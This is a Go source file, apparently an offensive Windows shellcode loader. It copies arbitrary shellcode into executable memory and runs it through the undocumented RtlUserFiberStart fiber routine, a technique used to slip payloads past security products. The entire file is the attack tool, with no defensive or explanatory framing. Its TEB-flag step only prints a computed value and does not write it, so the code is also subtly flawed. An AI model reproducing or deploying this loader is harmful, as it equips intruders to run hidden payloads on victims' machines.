package Loads

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

const (
	MEM_COMMIT               = 0x1000
	MEM_RESERVE              = 0x2000
	PAGE_EXECUTE_READWRITE   = 0x40
	TEB_FIBERDATA_PTR_OFFSET = 0x17ee
	HEAP_ZERO_MEMORY         = 0x00000008
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	HeapAlloc      = kernel32.MustFindProc("HeapAlloc")
	GetProcessHeap = kernel32.MustFindProc("GetProcessHeap")
	RtlMoveMemory  = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	hNtdll, err := windows.LoadLibrary("ntdll")
	if err != nil {
		log.Fatal(err)
	}
	RtlUserFiberStart, err1 := windows.GetProcAddress(hNtdll, "RtlUserFiberStart")
	if err1 != nil {
		log.Fatal(err1)
	}
	NtCurrentTeb, err2 := windows.GetProcAddress(hNtdll, "NtCurrentTeb")
	if err2 != nil {
		log.Fatal(err2)
	}
	teb, _, _ := syscall.SyscallN(NtCurrentTeb, 0)
	pTebFlags := teb + TEB_FIBERDATA_PTR_OFFSET
	pTebFlags1 := *(*int)(unsafe.Pointer(&pTebFlags)) | 0b100
	fmt.Println(pTebFlags1)
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	p1, _, _ := GetProcessHeap.Call()
	lpDummyFiberData, _, _ := HeapAlloc.Call(p1, HEAP_ZERO_MEMORY, 0x100)
	p2 := (*uintptr)(unsafe.Pointer(lpDummyFiberData + 0x0a8))
	*p2 = addr
	syscall.SyscallN(RtlUserFiberStart, 0)
}
